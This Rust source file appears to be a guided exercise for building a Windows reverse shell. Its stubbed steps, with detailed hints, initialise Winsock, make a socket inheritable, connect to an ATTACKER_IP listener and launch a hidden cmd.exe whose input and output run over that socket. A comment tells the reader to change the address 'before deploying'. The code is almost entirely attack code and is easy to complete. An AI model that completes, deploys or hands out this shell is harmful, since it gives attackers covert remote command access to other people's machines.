use std::mem;
use windows::Win32::Foundation::{HANDLE, HANDLE_FLAG_INHERIT, SetHandleInformation};
use windows::Win32::Networking::WinSock::{
    AF_INET, IPPROTO_TCP, SOCKADDR_IN, SOCKET_ERROR, SOCK_STREAM,
    WSASocketA, WSAStartup, WSADATA, connect, htons, inet_addr,
};
use windows::Win32::System::Threading::{
    CREATE_NO_WINDOW, INFINITE, PROCESS_INFORMATION, STARTF_USESTDHANDLES,
    STARTUPINFOA, CreateProcessA, WaitForSingleObject,
};
use windows::core::PSTR;

// Change these before deploying. Use 127.0.0.1 with nc -lvnp 4444 for local testing.
const ATTACKER_IP: &[u8] = b"127.0.0.1\0";
const ATTACKER_PORT: u16 = 4444;

fn main() {
    unsafe {
        // Step 1 — Initialize Winsock.
        // Every process must call WSAStartup before using any Winsock function.
        // Version 2.2 (MAKEWORD(2,2) = 0x0202) is the highest available on modern Windows.
        //
        // Hint: WSAStartup(
        //     wversionrequested: u16,   // 0x0202 — version 2.2
        //     lpwsadata: *mut WSADATA,  // out: filled with the Winsock implementation's capabilities
        // ) -> i32                      // 0 on success; the value itself is the error, not WSAGetLastError
        let mut wsa_data: WSADATA = mem::zeroed();
        let ret: i32 = todo!("WSAStartup(0x0202, &mut wsa_data)");
        assert_eq!(ret, 0, "WSAStartup failed: {ret}");

        // Step 2 — Create a TCP socket.
        // WSASocketA is used instead of the simpler socket() so we get a SOCKET value
        // that behaves as a Win32 HANDLE and can be passed into CreateProcessA.
        //
        // Hint: WSASocketA(
        //     af: ADDRESS_FAMILY,            // AF_INET — IPv4
        //     type_: SOCKET_TYPE,            // SOCK_STREAM — TCP (stream socket)
        //     protocol: IPPROTO,             // IPPROTO_TCP
        //     lpprotocolinfo: Option<...>,   // None — use default protocol
        //     g: u32,                        // 0 — no socket group
        //     dwflags: u32,                  // 0 — default; WSA_FLAG_OVERLAPPED not needed here
        // ) -> SOCKET                        // INVALID_SOCKET on failure (SOCKET(usize::MAX))
        let sock = todo!("WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, None, 0, 0)");

        // Step 3 — Make the socket handle inheritable.
        // Winsock sockets are not inheritable by default. CreateProcessA can only hand a handle
        // to the child if the handle has HANDLE_FLAG_INHERIT set.
        //
        // Hint: SetHandleInformation(
        //     hobject: HANDLE,        // sock.0 as HANDLE — treat the socket as a Win32 handle
        //     dwmask: HANDLE_FLAGS,   // HANDLE_FLAG_INHERIT — which flag bits this call controls
        //     dwflags: HANDLE_FLAGS,  // HANDLE_FLAG_INHERIT — set those bits to 1 (inherit)
        // ) -> Result<()>
        todo!("SetHandleInformation(sock.0 as HANDLE, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)").unwrap();

        // Step 4 — Connect to the attacker's listener.
        // Build a SOCKADDR_IN (IPv4 socket address) then call connect().
        // Port and IP must be in network byte order (big-endian).
        //
        // Hint for the address struct:
        //   let addr = SOCKADDR_IN {
        //       sin_family: AF_INET,
        //       sin_port:   htons(ATTACKER_PORT),   // htons converts host→network byte order
        //       sin_addr:   IN_ADDR { S_un: IN_ADDR_0 { S_addr: inet_addr(ATTACKER_IP.as_ptr()) } },
        //       sin_zero:   [0i8; 8],
        //   };
        //
        // connect(
        //     s: SOCKET,                        // sock
        //     name: *const SOCKADDR,            // &addr as *const SOCKADDR_IN as *const SOCKADDR
        //     namelen: i32,                     // mem::size_of::<SOCKADDR_IN>() as i32
        // ) -> i32                              // 0 on success, SOCKET_ERROR (-1) on failure
        let addr: SOCKADDR_IN = todo!("build SOCKADDR_IN for ATTACKER_IP:ATTACKER_PORT");
        let ret = todo!("connect(sock, &addr as *const _ as *const _, size as i32)");
        assert_ne!(ret, SOCKET_ERROR, "connect failed");

        // Step 5 — Launch cmd.exe with all standard handles wired to the socket.
        // STARTF_USESTDHANDLES tells CreateProcessA to use hStdInput/hStdOutput/hStdError
        // instead of the defaults. Setting all three to the socket handle means the shell
        // reads its input from the network connection and writes output back to it.
        //
        // Hint: STARTUPINFOA {
        //     cb:        mem::size_of::<STARTUPINFOA>() as u32,
        //     dwFlags:   STARTF_USESTDHANDLES,
        //     hStdInput:  sock.0 as HANDLE,
        //     hStdOutput: sock.0 as HANDLE,
        //     hStdError:  sock.0 as HANDLE,
        //     ..Default::default()
        // }
        //
        // CreateProcessA(
        //     lpapplicationname: PCSTR,                    // PCSTR::null() — use lpCommandLine instead
        //     lpcommandline: PSTR,                         // mutable pointer to b"cmd.exe\0" — Windows may modify the buffer
        //     lpprocessattributes: Option<...>,            // None
        //     lpthreadattributes: Option<...>,             // None
        //     binherithandles: BOOL,                       // TRUE — child must inherit the socket handle
        //     dwcreationflags: PROCESS_CREATION_FLAGS,     // CREATE_NO_WINDOW — no console popup
        //     lpenvironment: Option<*const c_void>,        // None — inherit parent environment
        //     lpcurrentdirectory: PCSTR,                   // PCSTR::null() — inherit parent CWD
        //     lpstartupinfo: *const STARTUPINFOA,          // &si
        //     lpprocessinformation: *mut PROCESS_INFORMATION, // &mut pi
        // ) -> Result<()>
        let mut si: STARTUPINFOA = todo!("STARTUPINFOA with socket as all three std handles");
        let mut pi = PROCESS_INFORMATION::default();
        let mut cmd = *b"cmd.exe\0";
        todo!("CreateProcessA(None, PSTR(cmd.as_mut_ptr()), ..., TRUE, CREATE_NO_WINDOW, ..., &si, &mut pi)").unwrap();

        // Step 6 — Wait for the shell process to exit.
        //
        // Hint: WaitForSingleObject(
        //     hhandle: HANDLE,        // pi.hProcess — the cmd.exe process handle
        //     dwmilliseconds: u32,    // INFINITE — block until the shell exits
        // ) -> WAIT_EVENT
        todo!("WaitForSingleObject(pi.hProcess, INFINITE)");
    }
}
